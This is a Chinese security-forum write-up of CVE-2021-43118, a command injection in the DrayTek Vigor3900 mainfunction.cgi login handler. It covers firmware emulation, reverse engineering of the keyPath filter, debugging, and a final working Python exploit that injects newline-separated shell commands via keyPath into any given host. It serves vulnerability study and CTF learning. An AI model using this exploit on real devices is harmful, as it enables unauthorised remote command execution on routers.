> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-282750.htm)

> [原创]Vigor3900 CVE-2021-43118 命令注入漏洞分析

目录

*   [Vigor3900 CVE-2021-43118 命令注入漏洞分析](#vigor3900-cve-2021-43118-命令注入漏洞分析)
*            [零、前言](#零、前言)
*            [一、漏洞信息](#一、漏洞信息)
*            [二、仿真](#二、仿真)
*                    [1. 基于 qemu 的 Sevnup 模拟启动](#1-基于qemu的sevnup模拟启动)
*                    [2. 找到服务并启动](#2-找到服务并启动)
*            [三、复现](#三、复现)
*            [四、分析](#四、分析)
*                    [1. 找到漏洞程序](#1-找到漏洞程序)
*                    [2. 找到命令注入点](#2-找到命令注入点)
*                    [3. 求解约束路径](#3-求解约束路径)
*                    [4. 构造命令注入](#4-构造命令注入)
*                    [5. burp 抓包构造 poc](#5-burp抓包构造poc)
*                    [6. 调试分析构造 poc](#6-调试分析构造poc)
*            [五、后记](#五、后记)

Vigor3900 CVE-2021-43118 命令注入漏洞分析
=================================

零、前言
----

此固件是`2024中国工业互联网安全大赛智能家电行业赛道选拔赛决赛`的一道题目，其中就可以直接用 CVE 直接命令执行。本人对 IoT 一直在尝试学习，这次的比赛见到了很多师傅非常厉害，这也是一个非常好的让我深入 IoT 漏洞挖掘和利用世界的契机。所以我打算完整分析一次这个赛题 / 固件，希望大家都有所收获。

> 文中提到的 Sevnup 工具是我本人自己编写的，直接开源给大家～源码发布在：[Sevnup](https://github.com/N1nEmAn/Sevnup)，欢迎 star 和使用。目前支持 armel 和 mipsel 架构的直接仿真。

一、漏洞信息
------

DrayTek Vigor 是一款 arm 架构路由器。该路由器存在一个远程命令注入漏洞，攻击者可以利用该漏洞，通过在 `mainfunction.cgi` 中注入格式错误的查询字符串，构造恶意的 HTTP 消息，从而在远程执行任意代码。

**受影响版本：**

*   DrayTek Vigor3900 1.5.1.3
*   DrayTek Vigor2960 1.5.1.3
*   DrayTek Vigor300B 1.5.1.3

二、仿真
----

### 1. 基于 qemu 的 Sevnup 模拟启动

直接使用命令启动系统级固件模拟，成功。

![](https://bbs.kanxue.com/upload/attach/202408/995344_ANP69T9SJUM4C58.webp)

### 2. 找到服务并启动

使用命令`find ./ -name *.httpd`发现了几个 httpd, 其中主要是 lighttpd。

![](https://bbs.kanxue.com/upload/attach/202408/995344_296Z35U6QT7Q59P.webp)

直接启动失败，说没有配置文件：

![](https://bbs.kanxue.com/upload/attach/202408/995344_VUEVTMN63UA9BNM.webp)

尝试找配置文件：  
![](https://bbs.kanxue.com/upload/attach/202408/995344_ZEG7MZM9JBSGJ3A.webp)

发现相关 http 的配置文件，尝试使用 lighttpd 的配置文件即可启动成功，命令如图。

![](https://bbs.kanxue.com/upload/attach/202408/995344_H8G2CXVTNRQPPFD.webp)

发现 http 服务启动成功：  
![](https://bbs.kanxue.com/upload/attach/202408/995344_NTQBU23JF5DNXK2.webp)

三、复现
----

我们首先获取网络上的 POC 脚本进行复现：

```
import requests
host='http://10.10.10.2'
def run_cmd(cmd):
    try:
        headers = {
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)Gecko/20100101 Firefox/75.0"
            }
        url = host + "/cgi-bin/mainfunction.cgi"
        data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"
        res = requests.post(url=url, data=data, timeout=(10, 15),headers=headers)
        if res.status_code == 200:
            return res.text
        else:
            print('error')
            return 1
    except Exception as e:
        return ""
 
data=run_cmd('cat
```

效果如下，说明仿真成功：

![](https://bbs.kanxue.com/upload/attach/202408/995344_K332ZUYFWYAKECD.webp)

四、分析
----

### 1. 找到漏洞程序

主要使用了 lighttpd 运行了 httpd 服务，然而怎么处理得看上述找到的 lighttpd.conf 配置文件：  
![](https://bbs.kanxue.com/upload/attach/202408/995344_KZRGSWU6HYZR3YT.webp)

可以看到大概是有 cgi-bin 去处理相关逻辑的。

![](https://bbs.kanxue.com/upload/attach/202408/995344_Q4C6APS65ZADN35.webp)

我们可以看到，确实存在 cgi-bin。

![](https://bbs.kanxue.com/upload/attach/202408/995344_ARD246ESF88CHTB.webp)

接着我们就在这里看到了漏洞描述的文件`mainfunction.cgi`。接下来我们对其进行深入分析。

### 2. 找到命令注入点

我们可以通过搜索 POC 的 keyPath 找到对应位置（shift+f12, 然后 alt+t 进行搜索）：

![](https://bbs.kanxue.com/upload/attach/202408/995344_CJ7CBUR9RWEJSXZ.webp)

点击进入后，查看其交叉引用（ctrl+x）：

![](https://bbs.kanxue.com/upload/attach/202408/995344_XY9GASF9CGX9XCR.webp)

显然第一个是有汇编指令 LDR 进行调用地方，我们双击进入并且 F5 反编译，得到头部伪代码如下：

```
haystack = getenv("HTTP_COOKIE");
 v0 = getenv("REMOTE_ADDR");
 strcpy(v38, "uci get acc_ctrl.access_control.validation_code");
 v1 = (char *)sub_21558(v38);
 strcpy(v38, "uci get acc_ctrl.access_control.fail_times");
 v2 = (const char *)sub_21558(v38);
 v35 = atoi(v2);
 v3 = (const char *)sub_20ECC(v0, ".", "_");
 snprintf(v38, 0x400u, "json -f /tmp/login_ip get ip.%s", v3);
 v4 = (const char *)sub_21558(v38);
 v36 = atoi(v4);
 Value = cgiGetValue(dword_42D0C, "keyPath");
 v6 = (const char *)cgiGetValue(dword_42D0C, "loginUser");
 v7 = cgiGetValue(dword_42D0C, "loginPwd");
 v8 = v6 == 0;
 if ( v6 )
   v8 = v7 == 0;
 v9 = (const char *)v7;
 if ( v8 || !Value )
 {
   v14 = cgiGetValue(dword_42D0C, "formusername");
   v17 = cgiGetValue(dword_42D0C, "formpassword");
 }
 else
 {
   v10 = off_42400[0];
   v11 = (const char *)sub_AD58(Value);
   snprintf(v40, 0x64u, "%s%s%s", v10, "_", v11);
   sub_AD58(v6);
   v12 = strlen(v6);
   v13 = sub_CEC4(v6, v12, v46);
   sub_CCC8(off_42404[0], v46[0], v13);
   snprintf(v38, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", v40, off_42404[0]);
   v14 = sub_21558(v38);
   sub_AD58(v9);
   v15 = strlen(v9);
   v16 = sub_CEC4(v9, v15, v46);
   sub_CCC8(off_42404[0], v46[0], v16);
   snprintf(v38, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", v40, off_42404[0]);
   v17 = sub_21558(v38);
   snprintf(v38, 0x400u, "rm -f '%s' '%s' '%s'", v40, off_42404[0], v33);
   system(v38);
 }

```

函数名称为 sub_2AB3C。

我们点击进入 cghiGetValue 函数得到：

```
// attributes: thunk
int __fastcall cgiGetValue(int a1, int a2)
{
  return __imp_cgiGetValue(a1, a2);
}

```

应该是把对应数据的值传入 a1 中。

显然重点在于 `system(v38);`。我们通过修复 v38 变量对最终作为命令传入的参数进行跟踪。

![](https://bbs.kanxue.com/upload/attach/202408/995344_VSSARHHQDYVHG23.webp)

从下网上看，我们发现 cmd 的一个部分 str_1 来自 v10 与 v11，我们考虑对其进行继续跟踪，改名为 str11 与 str12。然而发现 str11 来自 off_42400, 为`.data:00042400 C4 7E 03 00 off_42400 DCD aTmpRsaPrivateK` 也就是`/tmp/rsa/private_key`，而 str12 来自 Value 经过函数 sub_AD58 的返回值。函数暂时不深究，我们继续向上回溯分析。

![](https://bbs.kanxue.com/upload/attach/202408/995344_277YDSM6Q6KJWT5.webp)

然后我们发现，Value 就是 keypath 的值。也就是说如果要传入命令必然经过 keyPath。所以这就是注入点了。

### 3. 求解约束路径

在找到注入点之后，我们要分析，注入如何的数据能够走向执行 system(cmd) 的部分。我们标注 key_path 传入的数据就是 web_cmd，我们可以看见，他会经过一个比较：

```
if ( v8 || !web_cmd )
  {
    v14 = cgiGetValue(web_cmd_buf, "formusername");
    v17 = cgiGetValue(web_cmd_buf, "formpassword");
  }
  else

```

注意到 else 才是我们能执行命令的位置：

```
else
 {
   str11 = off_42400[0];
   str12 = (const char *)sub_AD58(web_cmd);
   snprintf(str_1, 0x64u, "%s%s%s", str11, "_", str12);
   sub_AD58(v6);
   v12 = strlen(v6);
   v13 = sub_CEC4(v6, v12, v46);
   sub_CCC8(str_2[0], v46[0], v13);
   snprintf(cmd, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", str_1, str_2[0]);
   v14 = sub_21558(cmd);
   sub_AD58(v9);
   v15 = strlen(v9);
   v16 = sub_CEC4(v9, v15, v46);
   sub_CCC8(str_2[0], v46[0], v16);
   snprintf(cmd, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", str_1, str_2[0]);
   v17 = sub_21558(cmd);
   snprintf(cmd, 0x400u, "rm -f '%s' '%s' '%s'", str_1, str_2[0], str_3);
   system(cmd);
 }

```

所以我们要想办法满足`v8 || !web_cmd == false`才能够触发命令执行。

换句话说，`!web_cmd`我们传入之后他肯定是 false 了，我们只需要 v8 也是 false 即可，也就是说 v8 是空指针或者没有内容或者为 0。

![](https://bbs.kanxue.com/upload/attach/202408/995344_XHP9VM62NVHXGNW.webp)

他的类型是 bool 类型。

![](https://bbs.kanxue.com/upload/attach/202408/995344_HACN934PZTR48V9.webp)

注释给出他是 zf, 也就是 0 标志位。我们发现对于 v8 有几个关键的赋值：

```
v8 = Value == 0;
if ( Value )
  v8 = v7 == 0;

```

首先 v8 为 Value == 0 的布尔值，我们希望 v8 是 false, 也就是说 Value 不是 0, 而且如果 value 有了的话，我们也希望 v7 不是 0, 这样就能确保 v8 为 0 了。

仔细观察发现 web_cmd_buf 其实依次从 keyPath、loginUser、loginPwd 取值，最后是从 loginPwd 取值到 web_cmd,Value,v7，所以我们这三个参数都要有, 才能满足 v8 为 false。

```
web_cmd = (unsigned __int8 *)cgiGetValue(web_cmd_buf, (int)"keyPath");
Value = (unsigned __int8 *)cgiGetValue(web_cmd_buf, (int)"loginUser");
v7 = cgiGetValue(web_cmd_buf, (int)"loginPwd");

```

### 4. 构造命令注入

得到路径之后我们继续分析如何构造命令进行注入：

```
str11 = off_42400[0];
str12 = sub_AD58(web_cmd);
snprintf(str_1, 0x64u, "%s%s%s", str11, "_", (const char *)str12);
sub_AD58(Value);
v12 = strlen((const char *)Value);
v13 = sub_CEC4(Value, v12, v46);
sub_CCC8(str_2[0], v46[0], v13);
snprintf(cmd, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", str_1, str_2[0]);
v14 = sub_21558(cmd);
sub_AD58(v9);
v15 = strlen((const char *)v9);
v16 = sub_CEC4(v9, v15, v46);
sub_CCC8(str_2[0], v46[0], v16);
snprintf(cmd, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", str_1, str_2[0]);
v17 = sub_21558(cmd);
snprintf(cmd, 0x400u, "rm -f '%s' '%s' '%s'", str_1, str_2[0], str_3);
system(cmd);

```

我们看看伪代码。我们发现可控的只有 web_cmd, 他会经过 sub_AD58 做一个处理。存在数据链条如下：

```
sub_AD58(web_cmd) -> str12 -> str_1=str11+"_"+str12 -> snprintf(cmd)

```

所以 ，此处我们还需要分析一下 sub_AD58 函数。函数具体如下：

```
unsigned __int8 *__fastcall sub_AD58(unsigned __int8 *result)
{
  unsigned __int8 *i; // r2
  int v2; // r3
  bool v3; // zf
  _BOOL4 v4; // r3
 
  for ( i = result; i; ++i )
  {
    v2 = *i;
    v3 = v2 == 96;
    if ( v2 != 96 )
      v3 = v2 == 59;
    if ( v3 || v2 == 124 || v2 == 62 || v2 == 32 )
    {
      *i = 43;
    }
    else
    {
      v4 = v2 == 36;
      if ( i == (unsigned __int8 *)-1 )
        v4 = 0;
      if ( v4 && i[1] == 40 )
      {
        i[1] = 43;
        *i = 43;
      }
      if ( !*i )
        return result;
    }
  }
  return result;
}

```

我修改变量名和一些数据类型得到如下，并且写一些注释方便各位分析查看：

```
unsigned __int8 *__fastcall change_str(unsigned __int8 *web_cmd)
{
  unsigned __int8 *string; // r2
  int char_; // r3
  bool flag; // zf
  _BOOL4 flag_2; // r3
 
  for ( string = web_cmd; string; ++string )
  {
    char_ = *string; // 获取当前字节
    flag = char_ == '`'; // 当char_是`那么flag为1,反之为0
    if ( char_ != '`' ) // 如果当前字节是`就不管了flag就是1。如果不是那么就再看看，当char是;的情况把flag赋值为1否则为0
      flag = char_ == ';';
    if ( flag || char_ == '|' || char_ == '>' || char_ == ' ' )
    {// 总结来说，如果char_是` ; | > 和空格都会被替换为+。
      *string = '+';
    }
    else
    {// 如果以上都不是，那么看看当前字符是不是$符号，如果是flag_2为1
      flag_2 = char_ == '$';
      if ( string == (unsigned __int8 *)'\xFF' )
        flag_2 = 0;//如果string是0xff就又赋值为0
      if ( flag_2 && string[1] == '(' ) // 如果第二个字符是( 而且flag2也为1那么就复制++给string的开头，也就是$(一起出现会被改为++
        qmemcpy(string, "++", 2);
      if ( !*string )//直到最后string的结为，返回web_cmd回去。注意这做的更改都是会返回的。
        return web_cmd;
    }
  }
  return web_cmd;
}

```

省流分析结果，我想传入命令但是不被更改为加号的话，那么就保证不出现以下字符：

```
`  | ; ? 空格 $( 不可一起出现

```

```
str12 = change_str(web_cmd);
snprintf(str_1, 0x64u, "%s%s%s", str11, "_", (const char *)str12);

```

处理之后传给 str12，会与 str11 和_和自己组合，我们为了与他们割裂可以用回车键将自己作为另一个命令。

```
snprintf(cmd, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", str_1, str_2[0]);
  v17 = sub_21558(cmd);
  snprintf(cmd, 0x400u, "rm -f '%s' '%s' '%s'", str_1, str_2[0], str_3);

```

最后还会做这样一系列的操作。所以我们前后都用回车键将命令分隔开。

综上我们需要构造 web_cmd 也就是

1.  keyPath 不得出现以上字符。
2.  keyPath、loginUser、loginPwd 都要赋值。其中 keyPath 是命令。
3.  keyPath 前后都要想办法分割。

### 5. burp 抓包构造 poc

知道需要构造的参数之后，我们还是无法知道如何调用到这个函数，目前根据配置文件知道可以使用 / cgi-bin/mainfunction.cgi 去调用这个 cgi（甚至对此也不是特别确定），但是如何去调用到这个函数呢？有点一头雾水，而且根据网上 poc 可以得出是 action 等于 login 吧？但是没法通过逆向找到具体的调用方式。

下面可以看到函数地址和一些相关字符串挨在一起待在 data 段。

![](https://bbs.kanxue.com/upload/attach/202408/995344_C3RAGGNGYRW8MWM.webp)

此时我想到，可以尝试一个比较快的方式，从而得知他的调用格式和发包方式：用 burp 抓包分析。如图，确实是使用 / cgi-bin/mainfunction.cgi 去调用 cgi，并且使用的是 POST 请求。POST 参数包括 action 和具体参数。  
![](https://bbs.kanxue.com/upload/attach/202408/995344_76AT242NC3WG2JE.webp)

![](https://bbs.kanxue.com/upload/attach/202408/995344_5BRZSQHP45UGHKC.webp)

![](https://bbs.kanxue.com/upload/attach/202408/995344_DN2GQM67R5KC4V2.webp)

会不会刚才 data 段里的内容就是字符串 action 及其对应的调用函数？

我们搜一个刚才看到的 action 的具体值：

![](https://bbs.kanxue.com/upload/attach/202408/995344_PE2FDT4QYZB7N75.webp)

果然就是在刚才那一段部分！也就是说推测是正确的。也就是说我们的 poc 可以构造 action=login。我们可以点击左边栏目查看（这个功能太强了）发现有 action=login 的，结果发现里面的参数和我们刚才分析的一模一样，只是多了一些别的参数。那些参数其实就在我们分析的函数下方，不过我们就不进一步分析了。

![](https://bbs.kanxue.com/upload/attach/202408/995344_58HDQB7JQ98P552.webp)

综上，我们分析得出：

1.  POST 请求
2.  /cgi-bin/mainfunction.cgi 在目的 ip 后面
3.  action=login
4.  keyPath 不得出现以上字符（` | ; ? 空格 $(不可同时出现 ）。keyPath 是命令。
5.  keyPath、loginUser、loginPwd 都要赋值。
6.  keyPath 前后都要想办法分割。

我们写了个脚本，发现没法做到执行命令。为此我们打算执行动态分析也就是调试。

```
import argparse
import requests
 
def system(host,cmd):
    try:
        print("[*] Start to execute command: " + cmd + " on " + host)
        headers = {
            "HOST":"10.10.10.2",
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
            "Content-Type": "text/plain; charset=UTF-8",
            "Accept": "*/*",
            }
        url = host + "/cgi-bin/mainfunction.cgi"
        data = f"action=login&keyPath={cmd}&loginUser=N1nEmAn&loginPwd=Hack&formcaptcha=YnVrZHg=&rtick=1722512530770"
        print("[*] Sending:",data)
        res = requests.post(url=url, data=data,headers=headers)
        if res.status_code == 200 and res.text != "":
            print("[+] Command executed successfully")
            print("[+] Result: " + res.text)
            return res.text
        else:
            print('[-] Command execute failed! Nothing...')
            return 1
    except:
        print('[-] Command execute failed!')
 
 
if __name__ == "__main__":
    # 获取第一个参数作为目标地址，第二个命令行参数作为命令
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="target host")
    parser.add_argument("cmd", help="command to execute")
    args = parser.parse_args()
    system(args.host, "ls")

```

### 6. 调试分析构造 poc

Sevnup 会把 qemu 映射到 1234 端口，直接用 gdb-multiarch 连接即可。之前做过 armpwn 知道寄存器排布如下：

> arm 架构中，调用号 3 是 read，4 是 write，5 是 open，0xb 是 execve。
> 
> r7 用来存储系统调用号。
> 
> r0,r1,r2 分别为三个参数。其中 r2 的控制较为麻烦，不过问题不大。

执行命令，其中 0xa4c8 是 system 的地址：

```
pwndbg> b * 0xa4c8
Breakpoint 1 at 0xa4c8
pwndbg> set architecture arm
The target architecture is set to "arm".
pwndbg> target remote :1234
Remote debugging using :1234

```

看到第一个参数就是命令，起码执行了 system 说明我们的路径约束没问题，主要是构造命令出了问题。

![](https://bbs.kanxue.com/upload/attach/202408/995344_TE2QPSZ5RXXETX6.webp)

我们看看我们的`ls`被改成什么了：

```
pwndbg> x/s $r0
0xbeaf8410: "rm -f '/tmp/rsa/private_key_ls' '/tmp/rsa/binary_login' 'ls'"

```

也就是说它实际上执行了：

```
rm -f '/tmp/rsa/private_key_ls' '/tmp/rsa/binary_login' 'ls'

```

这…… 显然没有达到我们想要的目的，他达成了删除三个东西。如何绕过呢？我们试试用`'`。

然而这样并不能解决嵌套命令的问题。而后我又尝试了用`\n`发现还是不能，因为`\n`导致直接截断了。最后发现可以用 URL 编码 %0A 解决这个问题！所以我们最后的脚本如下：

```
import argparse
import requests
 
def system(host,cmd):
    cmd = "\'%0A" + cmd + "%0A"
    try:
        headers = {
            "HOST":"10.10.10.2",
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36",
            "Content-Type": "text/plain; charset=UTF-8",
            "Accept": "*/*",
            }
        url = host + "/cgi-bin/mainfunction.cgi"
        data = f"action=login&keyPath={cmd}&loginUser=N1nEmAn&loginPwd=Hack"
        res = requests.post(url=url, data=data,headers=headers)
        if res.status_code == 200 and res.text != "":
            print("[+] Command executed successfully")
            print("[+] Result: \n" + res.text)
            return res.text
        else:
            print('[-] Command execute failed! Nothing...')
            return 1
    except:
        print('[-] Command execute failed!')
 
 
if __name__ == "__main__":
    # 获取第一个参数作为目标地址，第二个命令行参数作为命令
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="target host")
    parser.add_argument("cmd", help="command to execute")
    args = parser.parse_args()
    system(args.host, args.cmd)

```

至此完成分析。效果如下：  
![](https://bbs.kanxue.com/upload/attach/202408/995344_RWGGU4F53NMEBB4.webp)

五、后记
----

此次漏洞仿真、分析漏洞、构造 poc 的整个过程，对我来说是非常启发性的。对于 IoT 命令注入的漏洞挖掘总结来分为下面几点：

1.  找到注入点。
2.  分析路径约束。
3.  构造特定输入。
4.  逆向、bp 抓包分析如何发包。
5.  调试进一步分析，确定结果。

其中仿真也是非常重要的部分。整体来说这次分析学到了不少。比较词穷了，但是心里非常的兴奋，也希望大家看到这里和我的心情是一样的。谢谢你能看到这里～

[[培训] 内核驱动高级班，冲击 BAT 一流互联网大厂工作，每周日 13:00-18:00 直播授课](https://www.kanxue.com/book-section_list-174.htm)

最后于 8 小时前 被 N1nE 编辑 ，原因： 修正部分笔误

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#Linux](forum-150-1-161.htm)